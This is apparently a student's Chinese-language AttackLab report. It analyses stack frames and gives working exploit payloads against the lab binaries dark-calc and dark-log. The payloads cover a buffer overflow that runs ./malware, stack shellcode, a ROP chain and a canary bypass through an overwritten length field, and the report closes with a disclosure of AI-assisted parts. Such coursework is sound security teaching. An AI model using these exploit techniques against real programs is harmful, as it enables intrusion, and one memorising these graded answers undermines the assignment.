# AttackLab 实验报告

林诗航 24300240228

### 1. 观察栈帧 `input` (20 pts 报告)

![1](assets/1.png)

1. `input` 的直接调用者是 `main`，返回地址是 `0x401ad1`。
2. 
- `push rbp`：把调用者 `main` 的旧 `rbp` 压栈保存，`rsp -= 8`
- `mov rbp, rsp`：建立 `input` 的栈帧，此时 `rbp` 指向刚保存的旧 `rbp`
- `sub rsp, 0x10`：给 `input` 的局部变量分配 16 字节栈空间
- `$rbp : 0x0000721000800fe0  →  0x0000721000800ff0`；这个 `0x0000721000800ff0` 来自 `push rbp` 保存下来的 `main` 的 `rbp`
3. `$rbp : 0x0000721000800fe8  →  0x0000000000401ad1  →  <main+000e> mov eax, 0x0`；`0x0000000000401ad1` 是一个返回地址，即 `main` 中调用完 `input` 后要返回执行的下一条指令地址
4. `0x401acc <main+9>: call 0x401977 <input>`
5. 
- `call` 作用：将返回地址压栈；跳转到指定地址。
- prologue `push rbp; mov rbp,rsp; sub rsp,0x10` 作用：保存调用者的 `rbp`；建立当前函数的栈帧；为局部变量分配空间。
- `leave` 作用：等价于 `mov rsp,rbp; pop rbp`；丢弃局部变量空间；恢复调用者的 `rbp`；让 `RSP` 指向返回地址。
- `ret` 作用：从栈顶弹出返回地址到 `RIP`；`RSP += 8`；跳回调用者继续执行。

### 2. 用不同长度的字符串输入测试 `dark-calc` (5 pts 报告)

![2-1](assets/2-1.png)

1.
- 20 个字符: 被截断，只处理前 15 个字符；
- 32 个字符：段错误；

![2-2-1](assets/2-2-1.png)
![2-2-2](assets/2-2-2.png)
2.
- 根据汇编代码发现 `0x401ad1` 为 `input` 返回时跳转的地址，进一步调试进入 `input`，从第一张截图发现返回地址被存在栈空间的地址 `0x0000721000800fe8`；
- 临时字符数组 `expression` 接受输入的字符串，地址为 `0x0000721000800fd0`；
- 数据从 `0x0000721000800fd0` 不断向地址高位延伸，如第二张截图所示，最后超量的数据将 `0x0000721000800fe0` 的内容和 `0x0000721000800fe8` 存的地址完全覆盖

### 3. 利用缓冲区漏洞执行 `./malware` (25 pts 测试 + 5 pts 报告)

- 根据 2 的截图 `command_buf` 的地址为 `0x6030d0`；在 `gets(expression)` 后，直接从 `expression` 复制过来，`input()` 返回；在 `eval()` 函数原地将表达式包装成指令在 `system` 运行；
- 仅当 `dark-calc` 执行 `./malware` 时才成功，需要让 `system` 函数运行 `./malware`，那么需要：
    - 将输入的前缀改为 `./malware`，剩余 7 字符可直接用 `\0`
    - 将 `0x0000721000800fe0` 的内容照抄，否则会段错误；
    - 将 ret 跳转的地址改为 `system` 的地址之前的 `401a6b: mov $0x6030d0,%edi`，保证参数为 `command_buf`，然后立即运行 `system`，从而绕过 `echo $(())` 的包装；

那么构造如下：
```python
payload = b"./malware" + b"\x00" * 7 + b"\xf0\x0f\x80\x00\x10\x72\x00\x00" + b"\x6b\x1a\x40\x00\x00\x00\x00\x00"
```

结果如下：
![3](assets/3.png)

### 4. 用 GDB 检查 main 函数的机器码 (5 pts 报告)

1. 
- `main` 函数的前三行汇编为 `push rbp; mov rbp,rsp; mov eax,0x0`；
- 执行 `x /9xb 0x401ac3` 结果整理为 `55 48 89 e5 b8 00 00 00 00`；
- 对应的机器码： `push rbp` 为 `55`，`mov rbp,rsp` 为 `48 89 e5`，`mov eax,0x0` 为 `b8 00 00 00 00`；

2. 排列方式：
```
[0x401ac3, 0x401ac4) : push rbp
[0x401ac4, 0x401ac7) : mov  rbp,rsp
[0x401ac7, 0x401acc) : mov  eax,0x0
```

### 5. 栈空间执行 (25 pts 测试 + 5 pts 报告)

- 类似 3(Task1)，把 `0x0000721000800fe8` 处的返回地址改为 `expression` 的地址 `0x0000721000800fd0`；不能改为 `command_buf` 是因为 `strcpy` 遇到第一个 `0x00` 就停止，后面的 shellcode 不会被复制；不能直接跳到 `grade_eval`，需要先把参数寄存器 `edi` 置为 4。
- `expression` 缓冲区一共只有 16 字节，正好用来放 shellcode；它后面的 `0x0000721000800fe0` 存放 `rbp`，`0x0000721000800fe8` 存放返回地址。
- 我最初独立完成的版本是 `mov edi,4; mov ebx,0x401a87; call rbx; ret`：能正确输出目标字符串，但 `grade_eval` 的 `mov %edi,-0x4(%rbp)` 会把参数 4 写到 `0x0000721000800fdc`，覆盖 shellcode 末尾的 `ret`（在 `0xfdc`）；`grade_eval` 返回后从 `0xfdc` 执行 `04 00 00 00`（`add al,0; add [rax],al`），此时 `rax=0`，于是在 `0xfde` 触发段错误。崩溃发生在打印之后，不影响输出，但程序不能正常退出。
- 修改：不用 `call`，而是先把 `grade_eval` 返回后要去的 `0x401c1f`（`__wrap_main+0x11` 的 `mov rsp,r12; pop r12; ret`）压栈，再 `jmp rbx` 进入 `grade_eval`；这样 `grade_eval` 的 `leave/ret` 直接回到 `0x401c1f`，恢复 libc 栈，程序正常退出。

那么构造如下（15 字节指令 + 1 字节填充 + 保存的 `rbp` + 返回地址）：
```python
payload = b"\xbb\x87\x1a\x40\x00" + b"\x68\x1f\x1c\x40\x00" + b"\x6a\x04" + b"\x5f" + b"\xff\xe3" + b"\x00" + b"\xf0\x0f\x80\x00\x10\x72\x00\x00" + b"\xd0\x0f\x80\x00\x10\x72\x00\x00"
```

修改前的输出（输出后段错误）：
![5-1](assets/5-1.png)

修改后的输出（退出码 0）：
![5-2](assets/5-2.png)

### 6. ROP (10 pts 测试 + 10 pts 报告)

- `dark-calc-nx` 非 PIE（gadget 地址固定），但栈 NX 且地址随机；不能像第 5 题那样执行栈上 shellcode，改为覆盖 `input` 的返回地址，用 `.text` 里的 gadget 拼出 `grade_eval(4)`。
- `expression` 在 `rbp-0x10`，偏移 0x10 是保存的 `rbp`，0x18 是返回地址，0x20 起是链；`input` 的 `leave; ret` 后 `rsp` 指向 0x20，之后每个 gadget 的 `ret` 依次弹下一格。
- gadget 在 `0x4019d0–0x401ae3`：`0x401a33` 是 `pop rdi; ret`（藏在 `pop r15; ret` 的 `41 5f` 里），`0x401a40` 是 `ret`；`grade_eval` 为 `0x401978`，`exit@plt` 为 `0x4016e0`。
- 链为 `pop rdi; 4; ret; grade_eval; pop rdi; 0; ret; exit@plt`。`input` 的 `rbp` 16 字节对齐，`ret` 后 `rsp % 16 == 0`，所以在 `grade_eval` 和 `exit` 前各插一个 `ret` 对齐。

那么构造如下：
```python
p64 = lambda x: x.to_bytes(8, "little")
payload = b"A" * 16 + b"B" * 8 + p64(0x401a33) + p64(4) + p64(0x401a40) + p64(0x401978) + p64(0x401a33) + p64(0) + p64(0x401a40) + p64(0x4016e0)
```

结果如下：
![6](assets/6.png)

`Hope A will be your grade!`，程序 exit 0（88 字节）。链中地址含 `0x00`，`strcpy` 只复制前 27 字节到 31 字节的 `command_buf`，不会溢出；`eval` 不会执行。

### 7. Canary (10 pts 测试 + 10 pts 报告)

- `dark-log` 的 canary 在 `rbp-8`（`0x4016ea` 写入，`0x4017df` 检查），`pad[8]` 只是结构体填充、不检查；直接溢出到返回地址会跨过 `rbp-8`，触发 `__stack_chk_fail`（exit 134）。
- 绕过：`gets` 写到偏移 256 可以改 `len`，而 canary 在偏移 280；`memcpy(f.logMsg + f.len, f.expression, 128)` 的目标是 `rbp-0xa0 + len`，取 `len = 0xa8` 时正好是 `rbp+8`（返回地址），128 字节从 `expression[0..127]` 覆盖，不碰 canary。payload 共 260 字节：128 链 + 128 填充 + 4 字节 `len`。
- 链从 `expression[0]` 开始：`pop rdi; 4; ret; grade_eval`；`pop rdi` 为 `0x4018a3`，`ret` 为 `0x4018b0`，`grade_eval` 为 `0x401677`。
- 普通做法：`grade_eval` 后接 0，打印后 SIGSEGV，exit 139。`dark-log` 没有 `exit@plt` 或 `syscall`，且 `memcpy` 还覆盖了 `main` 的 canary（`input rbp+0x18`），不能 `ret` 回 `main`；测试只查 stdout，139 可通过。
- exit 0 补充：返回地址换成 `_start`（`0x401590`），下一格放 0 作 `argc`；`_start` 重新走 `__libc_start_main`，`main` 的 `input` 读到 EOF，打印 `Log saved.` 后 exit 0。
- 防止这种绕过：把 `len` 这类控制变量移到 `expression` 的低地址一侧（先声明 `int len` 再声明数组，即数组在高地址、标量在低地址）；这样 `gets` 向高地址溢出改不到 `len`，`len` 保持 0，`memcpy` 的目标固定在 `logMsg`，不会越过 canary 写到返回地址。

那么构造如下（exit 0 版本；把 `p64(0x401590)+p64(0)` 换成 `p64(0)` 就是普通做法，exit 139）：
```python
p64 = lambda x: x.to_bytes(8, "little")
chain = (p64(0x4018a3) + p64(4) + p64(0x4018b0) + p64(0x401677) + p64(0x401590) + p64(0)).ljust(128, b"\x00")
payload = chain + b"A" * 128 + (0xA8).to_bytes(4, "little")
```

结果如下：
![7](assets/7.png)

`Hope A will be your grade!`，随后 `Log saved.`，exit 0；普通做法只打印到目标字符串，exit 139。

### 使用的工具

- DeepSeek-V4.1-Flash-1017（通过 dsh 使用）：
  - 任务 1：帮助确认答案的出处。
  - 任务 5：最初仅用于查询 `call` 指令的语法；段错误的定位和修改由 AI 辅助完成。我在没有 AI 帮助时独立完成的最好成绩是 payload 能正确输出 `Hope A will be your grade!`，但程序在打印后触发段错误（见 `assets/5-1.png`）。AI 指出 `grade_eval` 的 `mov %edi,-0x4(%rbp)` 覆盖了栈上 shellcode 末尾的 `ret`，并建议改用 `push 返回地址; jmp rbx` 让程序正常退出（修改后的输出见第 5 节）。
  - 任务 6：ROP 的整体思路、gadget 地址（`pop rdi; ret`、`ret`）和链布局由 AI 提示，`payload_rop.py` 与本节报告由 AI 辅助完成并在本机验证。
  - 任务 7：在核对 canary 机制的基础上，`len` 绕过的具体排布、`_start` 的 exit-0 收尾由 AI 辅助整理，`payload_canary.py` 与本节报告由 AI 辅助完成并在本机验证。
- 除上述说明外，1–4 题的答案、payload 的构造与地址计算均由我独立完成。（git 仓库中 AI 辅助完成部分会标明 AI Assisted，不完美的历史记录可以在 git 的 commit 记录中找到）